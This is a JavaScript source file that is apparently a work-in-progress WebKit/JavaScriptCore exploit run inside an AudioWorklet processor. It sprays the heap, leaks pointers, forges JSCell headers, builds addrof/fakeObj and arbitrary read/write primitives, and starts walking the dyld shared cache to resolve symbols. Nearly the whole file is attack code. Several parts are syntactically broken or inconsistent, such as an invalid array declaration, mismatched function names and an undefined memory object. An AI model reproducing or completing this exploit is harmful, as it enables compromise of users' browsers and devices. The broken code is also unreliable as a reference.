// Utility functions.
//
// Copyright (c) 2016 Samuel Groß
//

// Display alert message

function delay(ms = 1000){
    var t1 = Date.now();
    while(Date.now() - t1 <= ms){

    }
}

/*function print(s){
    alert(s);
}*/

// Return the hexadecimal representation of the given byte.
function hex(b,c) {
    if (c) {
    if (b < 0)
        return `-${hex(-b)}`
    return `0x${b.toString(16)}`
    } else {
    return ("0" + b.toString(16)).substr(-2);
    }
}

// Return the hexadecimal representation of the given byte array.
function hexlify(bytes) {
    var res = [];
    for (var i = 0; i < bytes.length; i++)
        res.push(hex(bytes[i]));

    return res.join("");
}

// Return the binary data represented by the given hexdecimal string.
function unhexlify(hexstr) {
    if (hexstr.length % 2 == 1)
        throw new TypeError("Invalid hex string");

    var bytes = new Uint8Array(hexstr.length / 2);
    for (var i = 0; i < hexstr.length; i += 2)
        bytes[i/2] = parseInt(hexstr.substr(i, 2), 16);

    return bytes;
}

function hexdump(data) {
    if (typeof data.BYTES_PER_ELEMENT !== "undefined")
        data = Array.from(data);

    var lines = [];
    for (var i = 0; i < data.length; i += 16) {
        var chunk = data.slice(i, i+16);
        var parts = chunk.map(hex);
        if (parts.length > 8)
            parts.splice(8, 0, " ");
        lines.push(parts.join(" "));
    }

    return lines.join("\n");
}

// Simplified version of the similarly named python module.
var Struct = (function() {
    // Allocate these once to avoid unecessary heap allocations during pack/unpack operations.
    var buffer      = new ArrayBuffer(8);
    var byteView    = new Uint8Array(buffer);
    var uint32View  = new Uint32Array(buffer);
    var float64View = new Float64Array(buffer);

    return {
        pack: function(type, value) {
            var view = type;        // See below
            view[0] = value;
            return new Uint8Array(buffer, 0, type.BYTES_PER_ELEMENT);
        },

        unpack: function(type, bytes) {
            if (bytes.length !== type.BYTES_PER_ELEMENT)
                throw Error("Invalid bytearray");

            var view = type;        // See below
            byteView.set(bytes);
            return view[0];
        },

        // Available types.
        int8:    byteView,
        int32:   uint32View,
        float64: float64View
    };
})();

//
// Tiny module that provides big (64bit) integers.
//
// Copyright (c) 2016 Samuel Groß
//
// Requires utils.js
//

// Datatype to represent 64-bit integers.
//
// Internally, the integer is stored as a Uint8Array in little endian byte order.
function Int64(v) {
    // The underlying byte array.
    var bytes = new Uint8Array(8);
    var u32 = new Uint32Array(2);
    this.bytes = bytes;

    switch (typeof v) {
        case "number":
            v = "0x" + Math.floor(v).toString(16);
        case "string":
            if (v.startsWith('0x'))
                v = v.substr(2);
            if (v.length % 2 == 1)
                v = "0" + v;

            var bigEndian = unhexlify(v, 8);
            bytes.set(Array.from(bigEndian).reverse());
            break;
        case "object":
            if (v instanceof Int64) {
                bytes.set(v.getBytes());
            } else {
                if (v.length != 8)
                    throw TypeError("Array must have excactly 8 elements.");
                bytes.set(v);
            }
            break;
        case "undefined":
            break;
        default:
            throw TypeError("Int64 constructor requires an argument.");
    }

    // Return a double whith the same underlying bit representation.
    this.asDouble = function() {
        // Check for NaN
        if (bytes[7] == 0xff && (bytes[6] == 0xff || bytes[6] == 0xfe))
            throw new RangeError("Integer can not be represented by a double");

        return Struct.unpack(Struct.float64, bytes);
    };

    // Return a javascript value with the same underlying bit representation.
    // This is only possible for integers in the range [0x0001000000000000, 0xffff000000000000)
    // due to double conversion constraints.
    this.asJSValue = function() {
        if ((bytes[7] == 0 && bytes[6] == 0) || (bytes[7] == 0xff && bytes[6] == 0xff))
            throw new RangeError("Integer can not be represented by a JSValue");

        // For NaN-boxing, JSC adds 2^48 to a double value's bit pattern.
        this.assignSub(this, 0x1000000000000);
        var res = Struct.unpack(Struct.float64, bytes);
        this.assignAdd(this, 0x1000000000000);

        return res;
    };

    // Return the underlying bytes of this number as array.
    this.getBytes = function() {
        return Array.from(bytes);
    };

    // Return the byte at the given index.
    this.byteAt = function(i) {
        return bytes[i];
    };

    // Return the value of this number as unsigned hex string.
    this.toString = function() {
        return "0x" + hexlify(Array.from(bytes).reverse());
    };
    
    this.lo = function()
    {
        //let hex = hex1()
        u32[0] = this;
    var b = Array.from(u32);
    //alert(hex((b[0] | (b[1] << 8) | (b[2] << 16) | (b[3] << 24)) >>> 0,true))
    return hex((b[0] | (b[1] << 8) | (b[2] << 16) | (b[3] << 24)) >>> 0,true);
    };

    this.hi = function()
    {
        //let hex = hex1()
        u32[0] = this;
var b = Array.from(u32);
return hex((b[4] | (b[5] << 8) | (b[6] << 16) | (b[7] << 24)) >>> 0,true);
    };
    
    this.asInt32 = function() {
        var value = new Int64(0);
        for (var i = 0; i < 8; i++) {
            if (i < 4) {
                value.bytes[i] = this.bytes[i];
            } else {
                value.bytes[i] = 0;
            }
        }
        
        return parseInt("0x" + hexlify(Array.from(value.bytes).reverse()).slice(-8));
    };
    
    this.asInt16 = function() {
        var value = new Int64(0);
        for (var i = 0; i < 8; i++) {
            if (i < 2) {
                value.bytes[i] = this.bytes[i];
            } else {
                value.bytes[i] = 0;
            }
        }
        
        return parseInt("0x" + hexlify(Array.from(value.bytes).reverse()).slice(-8));
    };

    // Basic arithmetic.
    // These functions assign the result of the computation to their 'this' object.

    // Decorator for Int64 instance operations. Takes care
    // of converting arguments to Int64 instances if required.
    function operation(f, nargs) {
        return function() {
            if (arguments.length != nargs)
                throw Error("Not enough arguments for function " + f.name);
            for (var i = 0; i < arguments.length; i++)
                if (!(arguments[i] instanceof Int64))
                    arguments[i] = new Int64(arguments[i]);
            return f.apply(this, arguments);
        };
    }

    // this = -n (two's complement)
    this.assignNeg = operation(function neg(n) {
        for (var i = 0; i < 8; i++)
            bytes[i] = ~n.byteAt(i);

        return this.assignAdd(this, Int64.One);
    }, 1);

    // this = a + b
    this.assignAdd = operation(function add(a, b) {
        var carry = 0;
        for (var i = 0; i < 8; i++) {
            var cur = a.byteAt(i) + b.byteAt(i) + carry;
            carry = cur > 0xff | 0;
            bytes[i] = cur;
        }
        return this;
    }, 2);

    // this = a - b
    this.assignSub = operation(function sub(a, b) {
        var carry = 0;
        for (var i = 0; i < 8; i++) {
            var cur = a.byteAt(i) - b.byteAt(i) - carry;
            carry = cur < 0 | 0;
            bytes[i] = cur;
        }
        return this;
    }, 2);

    // this = a ^ b
    this.assignXor = operation(function xor(a, b) {
        for (var i = 0; i < 8; i++) {
            bytes[i] = a.byteAt(i) ^ b.byteAt(i);
        }
        return this;
    }, 2);
    
    // this = a & b
    this.assignAnd = operation(function and(a, b) {
        for (var i = 0; i < 8; i++) {
            bytes[i] = a.byteAt(i) & b.byteAt(i);
        }
        return this;
    }, 2);
    
    // this = a << b
    this.assignShiftLeft = operation(function shiftLeft(a, b) {
        for (var i = 0; i < 8; i++) {
            if (i < b) {
                bytes[i] = 0;
            } else {
                bytes[i] = a.byteAt(Sub(i, b).asInt32());
            }
        }
        return this;
    }, 2);
    
    // this = a >> b
    this.assignShiftRight = operation(function shiftRight(a, b) {
        for (var i = 0; i < 8; i++) {
            if (i < (8 - b)) {
                bytes[i] = a.byteAt(Add(i, b).asInt32());
            } else {
                bytes[i] = 0;
            }
        }
        return this;
    }, 2);
}

// Constructs a new Int64 instance with the same bit representation as the provided double.
Int64.fromDouble = function(d) {
    var bytes = Struct.pack(Struct.float64, d);
    return new Int64(bytes);
};

// Convenience functions. These allocate a new Int64 to hold the result.

// Return -n (two's complement)
function Neg(n) {
    return (new Int64()).assignNeg(n);
}

// Return a + b
function Add(a, b) {
    return (new Int64()).assignAdd(a, b);
}

// Return a - b
function Sub(a, b) {
    return (new Int64()).assignSub(a, b);
}

// Return a ^ b
function Xor(a, b) {
    return (new Int64()).assignXor(a, b);
}

// Return a & b
function And(a, b) {
    return (new Int64()).assignAnd(a, b);
}

// Return a << b
function ShiftLeft(a, b) {
    return (new Int64()).assignShiftLeft(a, b);
}

// Return a >> b
function ShiftRight(a, b) {
    return (new Int64()).assignShiftRight(a, b);
}

// Some commonly used numbers.
Int64.Zero = new Int64(0);
Int64.One = new Int64(1);

function iv(x){
    return new Int64(x).asJSValue();
}
// That's all the arithmetic we need for exploiting WebKit.. :)

//fuck.port.postMessage("starting");

function dec2hex(n) {
        if(n < 0) {
            n = 0xFFFFFFFF + n + 1;
        }
        return "0x" + ("00000000" + n.toString(16).toUpperCase()).substr(-8);
    }
function hex2a(hex) {
var str = "";
for (var i = 0; i < hex.length; i += 2) {
    var v = parseInt(hex.substr(i, 2), 16);
    if (v) str += String.fromCharCode(v);
}
return str;
}
    function _u32(i)
{
    return b2u32(this.read(i, 4));
}

function fsyms(mem, base, segs, want, syms)
{
    want = Array.from(want); // copy
    if(syms === undefined)
    {
        syms = {};
    }

    var stab = null;
    alert1("here");
    var ncmds = memory.u32(Add(base, 0x10));
    for(var i = 0, off = 0x20; i < ncmds; ++i)
    {
        var cmd = memory.u32(Add(base, off))
        if(cmd == 0x2) // LC_SYMTAB
        {
            var b = memory.read(Add(base, off + 0x8), 0x10);
            stab =
            {
                symoff:  b2u32(b.slice(0x8, 0xc)),
                nsyms:   b2u32(b.slice(0xc, 0x10)),
                stroff:  b2u32(b.slice(0x10, 0x14)),
                strsize: b2u32(b.slice(0x14, 0x18)),
            };
            break;
        }
        off += memory.u32(Add(base, off + 0x4));
    }
    if(stab == null)
    {
        fail("stab");
    }
    var tmp = { base: off2addr(segs, stab.stroff), off: 0 };
    var fn = function(i)
    {
        return memory.read(Add(tmp.base, tmp.off + i),0x10);
    };
    for(var i = 0; i < stab.nsyms && want.length > 0; ++i)
    {
        tmp.off = memory.u32(off2addr(segs, stab.symoff + i * 0x10));
        for(var j = 0; j < want.length; ++j)
        {
            var s = want[j];
            if((strcmp(fn, s)))
            {
                syms[s] = memory.read_i64(off2addr(segs, stab.symoff + i * 0x10 + 0x8));
                want.splice(j, 1);
                break;
            }
        }
    }
    return syms;
}

var FPO = typeof(SharedArrayBuffer) === "undefined" ? 0x18 : 0x10;
var VM_PROT_NONE = 0x0
var VM_PROT_READ = 0x1
var VM_PROT_WRITE = 0x2
var VM_PROT_EXECUTE = 0x4

function b2u32(b){
    return (b[0] | (b[1] << 8) | (b[2] << 16) | (b[3] << 24)) >>> 0;
}
function hexdump1(buffer, blockSize, base) {
    blockSize = blockSize || 16;
    var lines = [];
    var hex = "0123456789ABCDEF";
    for (var b = 0; b < buffer.length; b += blockSize) {
        var block = buffer.slice(b, Math.min(b + blockSize, buffer.length));
        var addr = Add(base,new Int64('0x'+("0000" + b.toString(16)).slice(-4))).toString(16);
        var codes = block.split('').map(function (ch) {
            var code = ch.charCodeAt(0);
            return " " + hex[(0xF0 & code) >> 4] + hex[0x0F & code];
        }).join("");
        codes += "   ".repeat(blockSize - block.length);
        var chars = block.replace(/[\x00-\x1F\x20]/g, '.');
        chars +=  " ".repeat(blockSize - block.length);
        lines.push(addr + " " + codes + "  " + chars);
    }
    return lines.join("<br/>");
}

function mappedAddress(mapping, addr1) {
    if(!(addr1 instanceof Int64)) addr1 = new Int64(addr1);
    for (cc = 0; cc < mapping.length; ++cc) {
        if ((mapping[cc].addr <= addr1) && (addr1 < (Add(mapping[cc].addr,mapping[cc].size)))) {
            // >= <
            var cacheoffset = Sub(Add(mapping[cc].fileoff,addr1),mapping[cc].addr);
            //alert("debug-cacheoffset:" + cacheoffset)
            return cacheoffset;
        }
        else {
            alert("mismatch" + addr1 + "vs" + Add(mapping[cc].addr,mapping[cc].size) + "or" + mapping[cc].addr)
        }
    }
}
function off2addr(mappings, off)
    {
  
        if(!(off instanceof Int64)) off = new Int64(off);
        for(var i = 0; i < mappings.length; ++i)
        {
            var start = mappings[i].fileoff; //cachestart
            var end   = Add(start, segs[i].size); //cacheend
           // alert("start" + start + "end" + end + "off" + off)
            if
            (
                (start.hi() < off.hi() || (start.hi() == off.hi() && start.lo() <= off.lo())) &&
                (end.hi() > off.hi() || (end.hi() == off.hi() && end.lo() > off.lo()))
            )
            {
                //print1ic = 1;
                //alert("returning"+ Add(segs[i].addr, Sub(off, start)));
                return Add(mappings[i].addr, Sub(off, start));
            }

        }
        //return new Int64("0x4141414141414141");
    }

function strcmp(b, str)
{
    var fn = typeof b == "function" ? b : function(i) { return b[i]; };
    for(var i = 0; i < str.length; ++i)
    {
        if(fn(i) != str.charCodeAt(i))
        {
            
            return false;
        }
    }
    return fn(str.length) == 0;
}

function sleep( sleepDuration ){
    var now = new Date().getTime();
    while(new Date().getTime() < now + sleepDuration){ /* do nothing */ } 
}
function gc() {
    for (let i = 0; i < 0x10; i++) {
            new ArrayBuffer(0x1000000);
        }
}

let data_view = new DataView(new ArrayBuffer(8));
var floatAsQword = float => {
    data_view.setFloat64(0, float, true);
    var low = data_view.getUint32(0, true);
    var high = data_view.getUint32(4, true);
    return low + (high * 0x100000000);
}
var qwordAsTagged = qword =>{
    return qwordAsFloat( qword- 0x02000000000000);
}
var qwordAsFloat = qword => {
    data_view.setUint32(0, qword%0x100000000, true);
    data_view.setUint32(4, qword/0x100000000, true);
    //data_view.setBigUint64(0, qword);
    return data_view.getFloat64(0, true);
}
function change_container(header, arr){
    try{}
    catch{}
    for(var i = 0; i < 0x100000; i++){
        ds[i].cellHeader = header;
        ds[i].butterfly = arr;
    }
}
const MY_OBJECT_OFFSET = 0x14fb0;
//MakeJitCompiledFunction();
//MakeJitCompiledFunction();


var a= new Array(10);
for(var i = 0; i < 0x1000; i++)
  a[i]= Array(0x40).fill(0.0);
var b = Array(0x40).fill(0.0);
var c = Array(0x40).fill(0.0);
var ds = new Array(0x100000);

let noCoW =13.37
let pad = new Array(noCoW, 2.2, {}, 13.37);
let pad1 = new Array(noCoW, 2.2, {}, 13.37, 5.5, 6.6, 7.7, 8,8);
let pad2 = new Array(noCoW, 2.2, {}, 13.37, 5.5, 6.6, 7.7, 8,8);

var evil_arr = new Array(noCoW, 2.2, 3.3, 4.4, 5.5, 6.6, 7.7, 8.8); //victim

var boxed = new Array(qwordAsTagged(0x41414141414141), noCoW, {}, 13.37, 5.5, 6.6, 7.7, 8,8);
var unboxed = new Array(noCoW, 13.37, 13.37, 13.37, 5.5, 6.6, 7.7, 8,8);



var victim = [noCoW, 14.47, 15.57];
victim['prop'] = 13.37;
victim['prop_1'] = 13.37;
let pad3 = new Array(noCoW, 2.2, {}, 13.37, 5.5, 6.6, 7.7, 8,8);

//var gcPreventer = [];
var structure_id = 0;
c[0] = 1.1;
var fuck = undefined;
var fuck2 = undefined;
var driver = undefined;
var stage = "leak"
var jscell_header = undefined;
var evil_arr_butterfly = undefined;
var expected_ptr = undefined;
eval(`
for(var i = 0; i < 0x10000; i++){
    var tag = qwordAsTagged(0x0108230700001000)
    ds[i] = {
        cellHeader1: tag,
        butterfly1: evil_arr,
        cellHeader2: tag,
        butterfly2: evil_arr,
        cellHeader3: tag,
        butterfly3: evil_arr
    };
}
`);
b.process = (inputs, outputs, parameters)=>{
    //sa
    //fuck.port.postMessage("starting");
    if(stage == "leak"){
        var expected_ptr = (BigInt(floatAsQword(c[4])) & 0xFFFFFFFFFFF00000n) - 0x100000n;
        expected_ptr = Number(expected_ptr);
        c[8] = qwordAsFloat(expected_ptr + 0x4010);
        c[9] = qwordAsFloat(0x0);
        stage  = "bypass_etc";
        fuck.port.postMessage(c);
        //sleep(4000);
        return true;
    }
    else if(stage == "bypass_etc"){
        //fuck.port.postMessage(typeof parameters);
         var gcPreventer = [];
        for (let i = 0; i < 2; i++) {
            let a = i == 0 ? parameters : victim;
            gcPreventer.push(a[0]);
        }
        jscell_header = gcPreventer[0];
        
        var gcPreventer = [];
        for (let i = 0; i < 2; i++) {
            let a = i == 0 ? parameters : victim;
            gcPreventer.push(a[1]);
        }
        evil_arr_butterfly = floatAsQword(gcPreventer[0]);
        
        structure_id = floatAsQword(jscell_header) & 0xFFFFFFFF;
        if(structure_id == 0 ){
            fuck.port.postMessage(`retry`);
            
            c[8] = qwordAsFloat(0);
            parameters = null;
            //sleep(10000000);
            //stage = "leak";
            return false;
        }
        fuck.port.postMessage(`jscell header : ${floatAsQword(jscell_header).toString(16)}`);
        
        //fuck.port.postMessage(`evil_arr_butterfly : ${evil_arr_butterfly.toString(16)}`);
        //return false;
        var cellHeader = jscell_header//qwordAsTagged( (0x01082307 * 0x100000000) + structure_id);
        //change_container(cellHeader, evil_arr);
        c[8] = qwordAsFloat(evil_arr_butterfly);
        evil_arr[0] = cellHeader;
        evil_arr[1] = qwordAsFloat(evil_arr_butterfly-0x8);

        stage = "r/w";
        return true;
    }
    else if(stage == "r/w"){
        for(var i =0; i < 2; i++){
            let a = i == 0 ? parameters: pad;
            a[0] = qwordAsFloat(0x133700001337);
        }
        fuck.port.postMessage(`evil_arr length : ${(evil_arr.length).toString(16)}`);
        evil_arr[0] = qwordAsFloat( (0x00010100 * 0x100000000) + structure_id);
        evil_arr[1] = qwordAsFloat(0);
        var boxed_offset = 0;
        for(var i = 0; i < evil_arr.length; i++){
            if(evil_arr[i] == qwordAsFloat(0x0041414141414140)){
                //fuck.port.postMessage(`boxed_arr length offset: ${(i).toString(16)}`);
                boxed_offset = i;
                break;
            }
        }
        
        var addrof = (obj)=>{ //aka
            boxed[0] = obj;
            return floatAsQword(evil_arr[boxed_offset]);
        }
        var fakeObj = (addr)=>{
            evil_arr[boxed_offset] = qwordAsFloat(addr);
            return boxed[0];
        }
        
        // Fill an array we are going to spray with arrays with an element & property,
    // specifically doubles (important! because we can use raw doubles to represent
    // pointers)
    var structure_spray[];
    for(var i = 0; i < 1000; i++) {
        var arr = [13.37];
        arr.a = 1337;
        arr['p'+i] = 13.37;                 // p+i instead of p in order to force new structure IDs
        structure_spray.push(arr)
    }

    // Pick a victim, any victim (seriously, any in the middle-ish)
    var victim = structure_spray[444];

    // Create some new arrays to do memory manipulation on, one 32 bit, the other 64.
    var convert = new ArrayBuffer(0x10);
    var u32 = new Uint32Array(convert);
    var f64 = new Float64Array(convert);

    // Setup flag values for ArrayWithDouble & ArrayWithContiguous
    u32[0] = 0x200; 
    u32[1] = 0x01082007 - 0x10000;
    var flag_dbl = f64[0];
    u32[1] = 0x01082009 - 0x10000;
    var flag_cnt = u32[0];

    // Create a placeholder object. Outer because it will be the "outer" of hax
    // Use contiguous so we can play with JSValues of objects. Changed to dbl/ptr later
    var outer = {
        cell_header: flag_cnt,
        butterfly: victim,
    };

    // Create our custom-crafted hax object
    // hax: cellheader of ArrayWithContiguous, butterfly is victim
    f64[0] = addrof(outer);
    u32[0] += 0x10;
    var hax = fakeobj(f64[0]);

    // Create and point boxed and unboxed to random locations
    // Their contents aren't important, only their types
    var unboxed = [13.37, 13.37, 13.37, 13.37, 13.37, 13.37, 13.37, 13.37, 13.37, 13.37, 13.37];
    unboxed = 4.2; // Disable/undo CopyOnWrite (forced to make new Array which is ArrayWithDouble)
    var boxed = [{}];

    // "Point" refers to changing the given array's butterfly
    // hax[1] = victim[]'s bfly, meaning that we can point victim[] using hax[1]
    //
    // First, point victim[] to unboxed[]
    // Second, save the location of unboxed
    // Third, point victim[] to boxed[]
    // Finally, point unboxed[] and boxed[] to the same place (give them same bfly)
    // 
    // This allows us to access victim[] and read/write adresses as doubles with unboxed[]
    // and then access them as objects with boxed[]
    hax[1] = unboxed;
    var tmp_bfly_ptr = victim[1];
    hax[1] = boxed;
    victim[1] = tmp_bfly_ptr;

    // Change hax[] from an ArrayWithContiguous into an ArrayWithDouble
    // This is necessary inorder to avoid boxing our values below when using hax[]
    outer.cell_header = flag_dbl;

    // Arbitrary read
    read64 = function(ptr) {
        f64[0] = ptr;
        u32[0] += 0x10; // Because accessing property does -0x10
        hax[1] = f64[0];
        return victim.a;
    }

    // Arbitrary write
    write64 = function(ptr, val) {
        f64[0] = ptr;
        u32[0] += 0x10; // Because accessing property does -0x10
        hax[1] = f64[0];
        victim.a = val;
    }
    print("[+] limited memory read/write working");
        
        
        stage="gc_test"
        return true;
    }
    else if(stage=="gc_test"){
        gc();
        fuck.port.postMessage(`Garbage Collected`);
        //sleep(100000);
        stage = "wasmfaker";
        return true;
    }
    else if (stage=="wasmfaker") {
    debugger;
    let fail = function fail(x)
    {
        fuck.port.postMessage(`FAIL: ` + x);
        location.reload();
        throw null;
    }
        var print1 = fuck.port.postMessage();
     
        stage = "parsecache";
        return true;
    }
    else if(stage =="parsecache") {
        print1(`success now about to parse dyld shared cache...`);
        memory.read64 = read64;
        memory.write64 = write64;
        memory.u32 = _u32;
        //gigauncager();

        print1("[*] Creating the HTMLDivElement wrapper...");
        var d = document.createElement("div");
        let ad_div = addrof(d);
        print1("[+] Address of the div is "+ad_div.toString(16));
        //alert(FPO)
        let exe_ptr = memory.read64(Add(ad_div, FPO));
        print1("[+] Executable instance is at "+exe_ptr.toString(16));
        let v_tlb = memory.read64(exe_ptr);
        print1("[+] divelement vtable seems to be at "+v_tlb.toString(16));
        var anchor = memory.read64(v_tlb);
        //function exponentiate(x, y) { return x ** y; }
        /*var l1, l2;
        l1[0] = {}
        l2[0] = {};
        var expr = "l1[0]; l2[0]; l1[0]; l2[0]; l1[0]; l2[0]; l1[0]; l2[0]; l1[0]; l2[0]; l1[0]; l2[0]; l1[0]; l2[0]; l1[0]; l2[0]; l1[0]; l2[0]; l1[0]; l2[0]; l1[0]; l2[0]; l1[0]; l2[0]; l1[0]; l2[0]; l1[0]; l2[0]; l1[0]; l2[0]; l1[0]; l2[0]; l1[0]; l2[0]; l1[0]; l2[0]; l1[0]; l2[0]; l1[0]; l2[0]; l1[0]; l2[0]; l1[0]; l2[0]; l1[0]; l2[0]; l1[0]; l2[0]; l1[0]; l2[0]; l1[0]; l2[0]; l1[0]; l2[0]; l1[0]; l2[0]; l1[0]; l2[0]; l1[0]; l2[0];";
        
        for (let i = -50; i <= 50; i += 0.1)
            eval(expr)
            for (let j = 0; j <= 1000; j++)
                exponentiate(i, j);*/
        //var anchor1 = memory.read_i64(anchor,0);
        //print1('anchor:' + anchor)
        //anchor is webcore
        //var vtab = 0x1B205A808;
        //var nslide = Sub(v_tlb, vtab) - 0x10;
        var hdr = Sub(anchor, anchor.lo() & 0xfff);
        //cache
       /*struct dyld_cache_header
       {
           char        magic[16];                // e.g. "dyld_v0    i386" 0-0x10
           uint32_t    mappingOffset;            // file offset to first dyld_cache_mapping_info 10-0x14
           uint32_t    mappingCount;            // number of dyld_cache_mapping_info entries 14-0x18
           uint32_t    imagesOffset;            // file offset to first dyld_cache_image_info 18-0x1C
           uint32_t    imagesCount;            // number of dyld_cache_image_info entries 1c-0x20
           uint64_t    dyldBaseAddress;        // base address of dyld when cache was built 20-0x24
           //28?
           uint64_t    codeSignatureOffset;    // file offset of code signature blob //0x2C
           uint64_t    codeSignatureSize;        // size of code signature blob (zero means to end of file) //
           uint64_t    slideInfoOffset;        // file offset of kernel slid info 0x34
           uint64_t    slideInfoSize;            // size of kernel slid info 0x3C
           uint64_t    localSymbolsOffset;        // file offset of where local symbols are stored
           //0x44
           uint64_t    localSymbolsSize; //0x4C       // size of local symbols information
           uint8_t        uuid[16]; // 0x54                // unique value for each shared cache file
           uint64_t    cacheType;         //0x64      // 1 for development, 0 for optimized
       };*/
       
       print1("dyld cache header @" + hdr); //dyld_cache_header
    
    //  sleep(2000);
        return true;
}
class OrigineWorklet extends AudioWorkletProcessor {
    constructor(){
        super();
        //var fuck2 = new AudioWorkletProcessor();
        return b;
    }
    static get parameterDescriptors() {
        return []
    }
    process (inputs, outputs, parameters) {
        
        return false;
    }
}
class OrigineWorklet2 extends AudioWorkletProcessor {
    constructor(){
        super();
        //console.log(c);
        this.port.onmessage = (e)=>{
        }
        
        fuck = this;
        //fuck.port.postMessage(c);
        return this;
    }
    static get parameterDescriptors() {
        return [{
            name: 'param2',
            defaultValue: 0.1337
        }];
    }
    process (inputs, outputs, parameters) {
        //
        //
        //this.port.postMessage(c);
        return false;
    }
}
registerProcessor('OrigineWorklet', OrigineWorklet);
registerProcessor('OrigineWorklet2', OrigineWorklet2);
